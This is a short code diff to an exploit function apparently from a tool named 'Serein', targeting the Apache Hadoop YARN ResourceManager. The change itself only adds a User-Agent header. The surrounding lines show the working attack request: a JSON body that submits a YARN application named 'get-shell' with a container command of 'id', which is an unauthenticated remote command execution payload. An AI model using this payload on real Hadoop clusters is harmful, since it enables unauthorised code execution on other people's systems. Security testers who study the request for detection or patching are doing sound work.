@@ -19,7 +19,8 @@ def Apache_Hadoop_Yarn_RPC_RCE_exp(url):
             "Accept": "*/*",
             "Accept-Encoding": "gzip, deflate",
             "Content-Length": "167",
-            "Content-Type": "application/json"
+            "Content-Type": "application/json",
+            "User-Agent": "Serein v2.7"
         }
         data = {"application-id": "application_1655112607010_0005", "application-name": "get-shell", "am-container-spec": {"commands": {"command": "id"}}, "application-type": "YARN"}
         proxies = {
